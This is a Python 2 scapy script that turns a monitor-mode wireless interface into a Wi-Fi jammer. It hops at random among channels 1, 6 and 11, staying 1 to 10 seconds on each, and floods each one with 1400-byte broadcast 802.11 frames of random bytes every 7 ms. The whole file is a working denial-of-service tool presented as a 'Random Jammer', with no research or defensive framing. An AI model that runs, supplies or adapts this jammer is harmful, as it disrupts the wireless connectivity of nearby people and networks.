#!/usr/bin/env python
# -*- coding: utf-8 -*-

from scapy.all import *
from collections import namedtuple
import random
import time
import struct
import os

# --- 1. Basic Configuration ---
# Make sure 'mon0' has already been set to Monitor mode using airmon-ng or iw
INTERFACE = "mon0"
CHANNELS = [1, 6, 11]

#os.system("iw dev %s set power_save off" % INTERFACE)

# Initialize the L2 socket
try:
    s = conf.L2socket(iface=INTERFACE)
except Exception as e:
    print "[!] Error: Could not open socket on %s. Check if interface is up." % INTERFACE
    exit(1)

prep = None

# Define the data structure: Timestamp, Channel, Power, Period(ms), Length(bytes)
JamSetting = namedtuple("JamSetting", "timestamp channel power period length")

# Generate a random payload pool
bytelist = [random.randint(-128, 127) for _ in range(1526)]

def update(js):
    """
    Update the hardware channel and rebuild the packet to be transmitted.
    """
    global prep
    
    # A. Switch the hardware channel
    current_channel = int(js.channel)
    print "[-] Switching hardware to Channel %d" % current_channel
    
    #os.system("iw dev %s set channel %d" % (INTERFACE, current_channel))
    os.system("nexutil -I %s -k%d" % (INTERFACE, current_channel))
    time.sleep(0.1)

    # B. Construct the packet (Radiotap + Dot11 + Raw)
    rt = RadioTap(len=18, present='Flags+Rate+Channel+dBm_AntSignal+Antenna')
    rt.Rate = 2
    rt.Channel = current_channel
    rt.dBm_AntSignal = -1 * int(js.power)
    
    hdr = Dot11(
        addr1='ff:ff:ff:ff:ff:ff',
        addr2='00:11:22:33:44:55',
        addr3='00:11:22:33:44:55'
    )

    l = int(js.length)
    if l > 1400:
        l = 1400
    
    sub = bytelist[0:l]
    buf = struct.pack('%sb' % l, *sub)
    pl = Raw(load=buf)

    # Pre-build the packet into a byte stream to improve transmission efficiency
    pkt = rt/hdr/pl
    prep = pkt.build()
    
    print "[-] Config Updated: Ch=%d, Pwr=%s, PktLen=%d" % (
        current_channel,
        js.power,
        l
    )

# --- 2. Main Execution Loop ---

# Set the initial parameters here.
# The default values are:
# Power = 30, packet interval = 7 ms, packet size = 1400 bytes
current_js = JamSetting(
    timestamp=0,
    channel=1,
    power=30,
    period=7,
    length=1400
)

print "--- Starting Random Jammer ---"
print "[*] Target Channels: %s" % CHANNELS
print "[*] Random Stay Time: 1 to 10 seconds"

try:
    while True:
        # 1. Randomly select a channel
        target_ch = random.choice(CHANNELS)
        
        # 2. Update the configuration object
        current_js = JamSetting(
            timestamp=time.time(),
            channel=target_ch,
            power=current_js.power,
            period=current_js.period,
            length=current_js.length
        )

        time.sleep(0.1)

        # 3. Perform the physical channel switch and rebuild the packet
        update(current_js)

        # 4. Randomly determine how long to stay on this channel
        # Current range: 1.0 to 10.0 seconds
        stay_time = random.uniform(1.0, 10.0)
        expiry = time.time() + stay_time
        
        print "[!] Hopping to Ch %d | Staying for %.2f seconds..." % (
            target_ch,
            stay_time
        )

        # 5. Continuously transmit packets while staying on this channel
        while time.time() < expiry:
            if current_js.power != 0:
                s.send(prep)
            
            # Keep the configured packet transmission interval
            # Convert milliseconds to seconds
            if current_js.period > 0:
                time.sleep(current_js.period / 1000.0)

except KeyboardInterrupt:
    print "\n[+] User requested stop. Exiting..."

except Exception as e:
    print "\n[!] Runtime Error: %s" % e